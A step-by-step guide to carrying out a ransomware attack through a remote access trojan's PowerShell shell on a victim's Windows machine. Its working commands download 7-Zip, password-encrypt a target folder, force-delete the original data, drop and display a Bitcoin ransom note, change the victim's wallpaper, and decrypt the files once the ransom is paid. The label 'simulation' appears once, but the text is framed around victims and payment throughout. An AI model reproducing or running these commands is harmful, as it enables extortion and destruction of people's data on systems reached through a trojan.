### **Step 1: Download 7-Zip Portable on Public Machine**

Use this link to download **7-Zip Portable** (no install needed), Via PowerShell of RAT:

```powershell
Invoke-WebRequest -Uri "https://www.7-zip.org/a/7za920.zip" -OutFile "C:\Users\Public\7z.zip"
```
---

### **Step 2: Extract 7-Zip CLI Binary**

Extract the ZIP to get `7za.exe` via RAT powershell:

```powershell
Expand-Archive -Path "C:\Users\Public\7z.zip" -DestinationPath "C:\Users\Public\7z"
```

After extraction, `C:\Users\Public\7z\7za.exe` will be available.

---

### **Step 3: Compress + Lock Target Folder**

Let’s say the folder to lock is:`C:\Users\Public\Documents\SecretData`

We’ll encrypt it into `C:\Users\Public\locked.7z` with the Password: `infected123`

```powershell
& "C:\Users\Public\7z\7za.exe" a -t7z "C:\Users\Public\locked.7z" "C:\Users\Public\Documents\SecretData" -p"infected123" -mhe
```
So now the whole folder (SecretData) is encrypted into `C:\Users\Public\locked.7z`, this location.
---

### **Step 4: Delete the Original Folder (Ransomware Simulation)**

```powershell
Remove-Item -Recurse -Force "C:\Users\Public\Documents\SecretData"
```

Now the folder is gone — and the locked data is available only in `C:\Users\Public\locked.7z`
---

### **Optional step: Create a note about getting ransom**

To give the victim a message regarding how to decrypt the folder, here is an example of note creation.

```powershell
cmd.exe /c echo Your files have been encrypted! > C:\Users\Public\Documents\ransom_note.txt
cmd.exe /c echo To recover them, send 1 Bitcoin to the following address: 1A2b3C4d5E6f7G8h9I0j >> C:\Users\Public\Documents\ransom_note.txt
cmd.exe /c echo Contact: hacker@example.com >> C:\Users\Public\Documents\ransom_note.txt
```

You can show the above in the victim's monitor via the following command:

```powershell
cmd.exe /c notepad C:\Users\Public\Documents\ransom_note.txt
```

### **Optional step: Change victim's walpaper**

Upload an image from your PC via RAT upload, in a location (e.g `C:\Users\niloy\Pictures\`). Then do the following in RAT shell.

```powershell
cmd.exe /c powershell -command "(Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);' -Name NativeMethods -Namespace Win32 -PassThru)::SystemParametersInfo(20, 0, 'C:\Users\niloy\Pictures\warning.jpg', 3)"
```

### **Final step: Decrypt It after getting ransom**

If ransom is paid do the following in RAT powershell:

```powershell
& "C:\Users\Public\7z\7za.exe" x "C:\Users\Public\locked.7z" -o"C:\Users\Public\Documents\Decrypted" -p"infected123"
```
